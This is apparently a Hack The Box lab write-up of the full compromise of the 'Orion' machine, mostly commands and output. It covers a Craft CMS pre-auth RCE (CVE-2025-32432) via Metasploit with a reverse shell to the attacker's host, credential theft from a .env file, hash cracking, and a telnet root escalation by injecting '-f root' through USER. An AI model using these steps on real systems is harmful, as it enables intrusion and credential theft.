# Orion - Hack The Box Writeup

## Reconnaissance

We began the engagement by performing directory fuzzing against the target web application at `http://orion.htb` using `ffuf`.

![[Pasted image 20260712180121.png]]

```bash
[+] Web port detected! Running fuzzing...

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://orion.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
 :: Output file      : orion.htb/content/ffuf_dirs.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 75ms]
#                       [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 86ms]
# Copyright 2007 James Fisher [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 84ms]
                        [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 102ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 116ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 133ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 139ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 159ms]
#                       [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 171ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 197ms]
#                       [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 210ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 219ms]
# directory-list-2.3-small.txt [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 311ms]
index                   [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 312ms]
# on atleast 3 different hosts [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 279ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 49ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 251ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 745ms]
```

![[Pasted image 20260712180315.png]]

The results highlighted several interesting endpoints, including `/admin` and `/assets`. Identifying the application as Craft CMS led to further research into known vulnerabilities.

## Foothold / Initial Access

Investigating Craft CMS vulnerabilities, we identified CVE-2025-32432, a Pre-Authentication Remote Code Execution (RCE) flaw.

An initial attempt to exploit this using a public Python exploit script ([https://github.com/cd-ratel/CVE-2025-32432](https://github.com/cd-ratel/CVE-2025-32432)) failed due to issues with the access log pollution on the server:

```bash
python3 exploit.py -u http://orion.htb -c id
[*] Fetching CSRF token from http://orion.htb/actions/users/session-info
[*]     CSRF: GuQ3_8KHZRjRpE2FFxAy7coW_iyvNeBKeJtymC8B...
[*] Probing for existing wrapper at /tmp/.cve32432_w.php
[*] Triggering gadget (assetId=2 itemFile=/tmp/.cve32432_w.php)
[*]     HTTP 500
[*] Wrapper missing; dropping to /tmp/.cve32432_w.php via log poisoning
[*] Poisoning access.log via User-Agent (len=1867)
[*]     poison request -> HTTP 200
[*] Triggering gadget (assetId=2 itemFile=/var/log/nginx/access.log)
[*]     HTTP 500
[!] Markers not found; log is polluted by an older `<?php ... exit; ?>`
[!] block that runs before the wrapper drop can fire.
[!] Fallback output below comes from the OLDER payload (stale).
[!] Fix: rotate access.log on the target, or reset the environment.
```

To work around this, we inspected the request in Burp Suite to manually extract a valid CSRF token.

**GET Request to `/admin/login`**
**GET Response Extract:**
```http
Set-Cookie: CraftSessionId=cesdc15vtv0mi791te0giid94n; path=/; HttpOnly
Set-Cookie: CRAFT_CSRF_TOKEN=37469b508196ab7c6690535d6d4f0c75abd62ba35dd00f939d58009d3371d424a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22Mv-f5oLYl5hOx5KZ5VlJioZmRJQ27Wv1yj8KTrhu%22%3B%7D; path=/; HttpOnly
"useEmailAsUsername":false,"usePathInfo":false,"csrfTokenName":"CRAFT_CSRF_TOKEN","csrfTokenValue":"DRNPSuF2Y8L3Y4CzkJprz-2OfR9DX22rYitXHfYRpB1UbcsprzLXd0BlYizUGS-bm1bo_OivIJXY2BFVKjA3xjBhBi_BRtIsLQfzYvtAvwI="
```

With the target confirmed vulnerable, we leveraged Metasploit's module for CVE-2025-32432 to gain a meterpreter session on the machine:

```shell
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set RHOSTS orion.htb
RHOSTS => orion.htb
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > options
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set LHOST 10.10.17.82
LHOST => 10.10.17.82
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit
[*] Started reverse TCP handler on 10.10.17.82:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Sending stage (45739 bytes) to 10.129.49.190
[*] Meterpreter session 1 opened (10.10.17.82:4444 -> 10.129.49.190:57234) at 2026-07-16 14:56:07 +0200

meterpreter > shell
Process 1992 created.
Channel 0 created.

script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
www-data@orion:~/html/craft/web$
```

We now had initial access as `www-data`. After exploring the filesystem, we located the Craft CMS configuration directory and found the `.env` file containing database credentials:

```bash
www-data@orion:~/html/craft$ cat .env
# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=dev

# General settings
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://orion.htb/
```

Using these credentials (`root` : `SuperSecureCraft123Pass!`), we connected to the MariaDB instance:

```bash
www-data@orion:~/html/craft$ mysql -u root -p orion
Enter password: SuperSecureCraft123Pass!

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 51
Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [orion]>
```

Dumping the user table from the database revealed a password hash for the user `adam`:
```text
adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

We saved this hash and cracked it offline using `hashcat` and the `rockyou.txt` wordlist:

```bash
┌──(julicc㉿arceus)-[~/orion.htb/exploits]
└─$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```

With the recovered password `darkangel`, we successfully logged into the machine via SSH as `adam` and retrieved the user flag:

```bash
┌──(julicc㉿arceus)-[~/orion.htb/exploits]
└─$ ssh adam@orion.htb
adam@orion.htb's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

...[snip]...

adam@orion:~$ cat user.txt
f40970c1e189d4e667d721c55c94de61
```

## Privilege Escalation

Once logged in as `adam`, we began local enumeration to identify potential privilege escalation paths. Checking the local listening ports using `netstat` revealed that port 23 (telnet) was running locally:

```bash
adam@orion:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:23            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68   
```
```text
telnet	23/tcp	0.221265
domain	53/tcp	0.048463
```

Checking the telnet client version installed on the system showed it was `GNU inetutils 2.7`:

```bash
adam@orion:~$ telnet --version
telnet (GNU inetutils) 2.7
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by many authors.
```

The GNU inetutils `telnet` client has a known automatic login vulnerability where specifying a user using `-f` combined with `-a` allows for arbitrary user impersonation if not properly mitigated by the server configuration. We exploited this by forcing an automatic login as `root` against the local telnet daemon:

```bash
adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/1)

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

...[snip]...

root@orion:~#
```

The exploit was successful, granting us an interactive root shell and full compromise of the machine.

## Conclusion

The Orion machine highlights the critical importance of keeping web application platforms, such as Craft CMS, updated to mitigate severe vulnerabilities like pre-authentication RCE (CVE-2025-32432). After obtaining initial access through this vector, poor credential management (storing database credentials in `.env` files accessible to the web user) and weak passwords enabled lateral movement to a user account. Finally, the privilege escalation underscored the risk of running outdated or vulnerable local services (GNU inetutils telnet 2.7), which allowed an unprivileged user to effortlessly escalate to root.
